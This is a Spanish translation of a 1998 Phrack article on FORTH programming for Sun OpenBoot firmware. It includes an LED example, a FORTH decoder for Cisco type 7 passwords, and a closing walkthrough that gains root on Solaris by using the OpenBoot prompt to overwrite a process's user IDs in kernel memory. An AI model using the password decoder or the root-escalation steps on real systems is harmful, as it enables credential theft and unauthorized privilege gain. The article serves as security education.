@@ -1,0 +1,396 @@
+---[  Phrack Magazine   Volumen 8, Numero 53 Julio 8, 1998, articulo 09 de 15
+
+
+-------------------------[  FORTH Hacking en Hardware Sparc
+
+
+--------[  mudge <mudge@l0pht.com>
+
+
+                         L0pht Heavy Industries
+                        [ http://www.L0pht.com ]
+                               presents
+
+                    FORTH Hacking en Hardware Sparc
+                            mudge@l0pht.com
+
+
+[Disclaimer - realmente puedes joder tu sistema usando mal la informacion
+ siguiente si lo haces incorrectamente. Ni The L0pht ni el autor toman
+ ninguna contabilidad por el mal uso de esta informacion.
+ Precaucion: Contenidos bajo presion! ]
+
+Entonces aqui estamos, alrededor de las 12:45am en una ma~ana de Lunes.
+SpaceRouge de l0pht termino pateandome el culo la noche entera aunque yo
+disfrute de todos modos debido a un pletora de Guinness.  Route ha estado
+respirando en mi nuca por un articulo para PHRACK y ya que el unico que
+le propuse la ultima vez ambos lo consideramos como completamente
+moralmente irresponsable (despues de todo, nos gusta que Internet funcione
+en una base _algo_ consistente), me encuentro dragando trucos bizarros y
+knickknacks con los que he estado jugando.
+
+FORTH.  Bueno, puedo decir que es la onda del futuro pero ha estado dando
+vueltas por un largo tiempo y no parece estar ganando una tremenda
+popularidad.  Sin embargo, se sabe que es un lenguaje de programacion
+increiblemente interesante que, lo sepas o no, juega un rol muy clave en
+alguno de nuestro hardware favorito.  Sun Microsystems usa forth para su
+implementacion OpenBoot.  Lo que significa es que cuando refuerzas algo
+de una vieja Sun 3/60 que esta basada en el Motorola 680X0 a un UltraSparc
+Server basado en el procesador 64 bits de UltraSparc, el hardware y
+el codigo bootstrapping inicial son manejados por un interprete FORTH.
+
+Por un largo tiempo era infrecuente que un hacker pudiera realmente poner
+sus manos, legitimamente, en una pieza de hardware Sun y jugar con el prom
+OpenBoot.  Hoy en dia he observado compa~ias a traves de viejas Sun 2,
+Sun 3 e incluso Sparc ELC e IPC en largas cantidades.  Frecuentando tu
+Ham Radio local o mercados de Tecnologia pueden generalmente producir un
+sistema Sun viejo para muy poco efectivo.  Entonces de nuevo, si trabajas
+con ellos tienes "libre" acceso para jugar con el hardware y a veces de eso
+es lo que se trata.
+
+Solia tener una Sparc en casa, en el l0pht y en el trabajo.  Las primeras
+dos fueron recogidas por la basura y la tercera debido al hecho de que
+pare de comer hamburguesas y me decidi a hacer la misma cantidad de dinero
+haciendo algo en lo que estoy mas interesado (sonrisa).  Si, hay muchos
+agujeros en Solaris, SunOS y los otros sistemas operativos que corren en
+arquitectura Sparc (tales como NeXSTEP y los *BSDs) pero es siempre
+divertido ver como arranca el sistema como casi nadie ve para pensar acerca
+de seguridad en ese punto.  En este articulo empezaremos escribiendo un
+simple programa que activa y desactiva la luz del LED en el hardware.
+Luego escribiremos un desencriptador de passwords cisco tipo 7 para Pforth -
+que es un interprete FORTH escrito para la PDA PalmPilot de 3Com.  En ese
+punto quiero mostrarte como cambiar la estructura credencial de un proceso
+corriendo a 0 (root).
+
+FORTH es un lenguaje muy simple y poderoso.  Es tremendamente peque~o y
+compacto que lo confiere extremadamente bien para sistemas fijos.
+Esta es una de las razones principales por las que el bootstrapping del
+hardware y software en Suns es hecho en FORTH.  Si alguna vez has usado
+una calculadora cientifica, o a menudo te has referido a ella como
+"Reverse Polish Notation", entonces entiendes el permiso basado en la pila
+detras de FORTH.
+
+[pasadas 1.5 semanas]
+
+EEEKS!  Entonces estoy registrando en algunos de mis archivos y encontre
+que no he estado cumpliendo con mis intenciones de terminar este articulo...
+Un momento, un vaso mas de port (es siempre mejor irse a port despues de un
+par de cervezas...).  Ahh. Ok, sobre algunos ejemplos basicos de Forth
+para que todos esten en lo correcto. Probemos el viejo estandar de 2+3.
+
+En notacion basada en pila esto es expresado como 2 3 +.  Piensa en cada
+elemento siendo pusheado en la pila y los operandos lidiando con las capas
+superiores en orden reverso.  Asi, 2 pushea el numero 2 en la pila, 3
+pushea el numero 3 en la pila, y + dice que saque los dos numeros superiores
+de la pila y pushee el resultado en su lugar en la pila [diagrama 1].
+
+[diagrama 1]
+
+     2    3   +
+
+   ---   ---   ---
+  | 2 | | 3 | | 5 |
+   ---  |---|  ---
+        | 2 |
+         ---
+
+[nota: para popear el tope de la pila y mostrarlo en pantalla tipo '.']
+
+
+Simple?  Acertaste.  Pruebalo en tu pieza de hardware Sun favorita.  L1-A
+(la clave L1 podria ser etiquetada 'Stop') echale un vistazo a lo siguiente:
+
+<++> EX/4th/blink.4
+ok :light-on
+     1 aux@ or aux! ;
+ok :light-off
+     1 invert aux@ and aux! ;
+ok
+<-->
+
+Ahora cuando tu tipeas light-on, el led en el frente de Sparc se enciende.
+Del mismo modo, light-off apaga el led.  En instalaciones con OpenBoot 3.x
+creo que esto es una word built in de FORTH como led-on y led-off.
+Versiones mas antiguas de OpenBoot no tienen esta word built in - pero
+ahora puedes agregarla.
+
+Aqui esta todo lo que realmente significa esto -
+   :light-on  - esto marca el principio de una nueva definicion word que
+                termina con un semi-colon como se ve.
+   1          - pushea 1 en la pila.
+   aux@       - toma el valor guardado en el registro aux y lo pushea en la
+                pila.
+   or         - toma los dos valores top de la pila, los ORea y deja el
+                resultado en su lugar.
+   aux!       - toma el valor en el tope de la pila y lo escribe al registro
+                aux.
+   ;          - termina la definicion word.
+
+   :light-off - esto marca el principio de una nueva definicion word que
+                termina cuando un semi-colon es visto.
+   1          - pushea 1 en la pila.
+   invert     - invierte los bits o el valor en el tope de la pila
+   aux@       - toma el valor guardado en el registro aux y lo pushea
+                en la pila.
+   and        - toma los dos valores tope de la pila, los ANDea y deja
+                el resultado en su lugar.
+   aux!       - toma el valor en el tope de la pila y lo escribe al registro
+                aux.
+   ;          - termina la definicion word.
+
+  [nota - puedes ver el desensamblamiento de los words led-on / led-off,
+          si estas en tu openboot con ' ok led-on (see)' ]
+
+----
+
+La PalmPilot es una peque~a PDA basada en el procesador Motorola 68328
+(DragonBall).  En el L0pht todos fuimos y buscamos PalmPilots tan pronto
+como vimos todas las maravillosas caracteristicas sin usar del procesador
+Motorola en ella.  Ahhhh, nos lleva de regreso a sentimientos similares
+de joder con el 6502.
+
+PForth es un poco diferente de la implementacion OpenBoot de forth en
+algunas formas menores - mas notablemente en las input bases por defecto
+y como son manejadas las words tales como 'abort'.  Me figuro que una peque~a
+app para la Pilot en FORTH podria ayudar a la gente a ver la utilidad del
+lenguaje en otros dispositivos ademas del firmware de Sun.
+El porting de esto para trabajar en un entorno OpenBoot se deja como un
+ejercicio para el lector.
+
+El desencriptador de passwords cisco tipo 7 es un poco mas complejo que el
+ejemplo led-on / led-off anterior [ve los libros de referencia al final
+de este articulo para una explicacion mucho mas precisa del lenguaje FORTH].
+
+--begin cisco decryptor--
+<++> EX/4th/cisco_decryptor.4
+\ cisco-decrypt
+
+include string
+( argh! We cannot _create_ the )
+( constant array as P4th dies )
+( around the 12th byte - )
+( thus the ugliness of setting it )
+( up in :main   .mudge)
+
+variable ciscofoo 40 allot
+variable encpw 60 allot
+variable decpw 60 allot
+variable strlen
+variable seed
+variable holder
+
+:toupper ( char -- char )
+ dup dup 96 > rot 123 < and if
+ 32 -
+ then ;
+
+:ishexdigit ( char -- f )
+ dup dup 47 > rot 58 < and if
+  drop - 1
+ else
+  dup dup 64 > 71 < and if
+  drop - 1
+ else
+  drop 0 then then ;
+
+:chartonum ( char -- i )
+ toupper
+ dup ishexdigit 0= if
+  abort" contains invalid char "
+ then
+ dup
+ 58 < if
+  48 -
+ else
+  55 -
+ then ;
+
+:main
+100 ciscofoo 0 + C!
+115 ciscofoo 1 + C!
+102 ciscofoo 2 + C!
+100 ciscofoo 3 + C!
+59 ciscofoo 4 + C!
+107 ciscofoo 5 + C!
+115 ciscofoo 6 + C!
+111 ciscofoo 7 + C!
+65 ciscofoo 8 + C!
+44 ciscofoo 9 + C!
+46 ciscofoo 10 + C!
+105 ciscofoo 11 + C!
+121 ciscofoo 12 + C!
+101 ciscofoo 13 + C!
+119 ciscofoo 14 + C!
+114 ciscofoo 15 + C!
+107 ciscofoo 16 + C!
+108 ciscofoo 17 + C!
+100 ciscofoo 18 + C!
+74 ciscofoo 19 + C!
+75 ciscofoo 20 + C!
+68 ciscofoo 21 + C!
+
+32 word count (addr + 1, strlen )
+strlen!
+
+encpw strlen @ cmove> drop
+
+cr
+
+( make sure the string is > 3 chars )
+strlen @ 4 < if abort" short input"
+then
+
+strlen @ 2 mod ( valid encpw's )
+( must have even number of chars )
+0= 0= if abort" odd input" then
+
+encpw C@ 48 - 10 *
+encpw 1 + C@ 48 - + seed!
+
+seed @ 15 > if abort" incalid seed"
+then
+
+0 holder !
+
+strlen @ 1 + 2 do
+ i 2 = 0= i 2 mod 0= and if
+  holder @ ciscofoo seed @ + C@ xor
+  emit
+  seed @ 1 + seed !
+  0 holder !
+  i strlen @ = if
+   cr quit then
+  then
+
+  i 2 mod 0= if
+  encpw i + C@ chartonum 16 *
+  holder !
+ else
+  encpw i + C@ chartonum holder @ +
+  holder !
+ then
+
+loop ;
+<-->
+
+--end cisco decryptor--
+
+
+Ok - despues de esta breve excursion retornamos al hardware Sparc.
+
+Entonces, como puede ser usada esta informacion desde un punto de
+entendimiento hacking mas tradicional?  Digamos que estas sentado en un
+lindo sistema corriendo Solaris pero por cualquier razon solo tienes una
+cuenta sin privilegios.  Ya que no hay ningun setup en el hardware para
+delinear diferentes usuarios y su habilidad para acceder a memoria
+(bueno, no en la forma en la que piensas dentro de procesos Unix)
+realmente puedes pasear libremente por el sistema.
+
+A cada proceso le es asignada una estructura definiendo varios aspectos
+acerca de el.  Esto es necesitado cuando los procesos son intercambiados
+dentro y fuera de memoria.  Como un usuario regular en realidad no estas
+habilitado para joder con esta estructura pero un rapido L1-A nos lleva
+a eso.  Mirando en /usr/include/sys/proc.h muestra que lo que realmente
+esta despues son las credenciales de la estructura del proceso.
+Esto esta ubicado despues de un puntero a vnode, un puntero a la direccion
+del espacio del proceso, y dos locks mutex.  En este punto hay un puntero
+a una estructura cred que tienen las credenciales del proceso.  Dentro de
+las credenciales de la estructura del proceso encuentras:
+
+     reference count     (long)
+     effective user id   (short)
+     effective group id  (short)
+     real user id        (short)
+     real group id       (short)
+     "saved" user id     (short)
+     "saved" group id    (short)
+     etc...
+
+Todavia brillan los ojos?  Todas esas variables son accesibles cuando estas
+en el comando prompt.  La primer cosa que necesitas figurarte es el
+comienzo de la estructura proc para una ID de proceso dado (PID).  Asumamos
+que tenemos un shell corriendo (tcsh en este caso).  En tcsh y csh el PID
+del shell esta guardado en $$.
+
+    Alliant+ ps -eaff | grep $$
+    mudge   914   913  1 15:29:31 pts/5    0:01 tcsh
+
+Si estoy del todo seguro, ese es mi tcsh. Ahora simplemente usa ps para
+encontrar el comienzo de la estructura proc:
+
+    Alliant+ ps -lp $$
+    F S   UID   PID  PPID  C PRI NI     ADDR     SZ    WCHAN TTY      TIME CMD
+    8 S   777   914   913  0  51 20 f5e09000    436 f5e091d0 pts/5    0:01 tcsh
+
+Puedes encontrar la disposicion de tu estructura proc en
+/usr/include/sys/proc.h.  De esto es aparente que el puntero a la estructura
+credencial esta ubicado 24 bytes dentro de la estructura proc.  En el
+ejemplo anterior esto significa que el puntero esta en
+0xf5e09000 + 0x18 or 0xf5e09018.  La estructura credencial esta listada en
+/usr/include/sys/cred.h.  De esto notamos que la id efectiva de usuario
+esta 4 bytes dentro de la estructura cred.
+
+Asi puedes ver que no tengo nada escondido bajo mis mangas -
+
+    Alliant+ id
+    uid=777(mudge) gid=1(other)
+
+Enciende el sistema OpenBoot via L1-A y obtiene el puntero a la estructura
+cred via:
+
+ok hex f5e09000 18 + l@ .
+f5a99858
+ok go
+
+Ahora, obtiene la id efectiva de usuario por
+ok hex f5a99858 4 + l@ .
+309   (309 hex == 777 decimal)
+ok go
+
+Por supuesto tu quieres cambiar esto a 0 (euid root):
+ok hex 0 f5a99858 4 + l!
+ok go
+
+chequea tus credenciales!
+
+Alliant+ id
+uid=777(mudge) gid=1(other) euid=0(root)
+
+Si quieres cambiar la id real de usuario puede ser un offset de 12 (0xc):
+
+ok hex 0 f5a99858 c + l!
+ok go
+
+Alliant+ id
+uid=0(root) gid=1(other)
+
+Es necesario decir que, hay un mundo completamente diferente dentro del
+hardware en frente de ti que esta mendigando con lo que jugar.  Ten en mente
+que puedes hacer un da~o serio jodiendo de esta manera.
+
+disfruta,
+
+mudge@l0pht.com
+---
+http://www.l0pht.com
+---
+
+Algunos libros excelentes sobre FORTH con los que deberias aprender algo mas:
+
+    Starting FORTH, Leo Brodie, Prentice-Hall, Inc. ISBN 0-13-842922-7
+    OpenBoot 3.x Command Reference Manual, SunSoft [get from a Sun Reseller]
+
+    Pilot FORTH was written by Neal Bridges (nbridges@interlog.com) -
+    http://www.interlog.com/~nbridges
+
+
+----[  EOF
+
+
+ Traducido por Active Matrix - schyzophrenia@gmx.net
+ Para RareGaZz - http://www.raregazz.com.ar - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
+
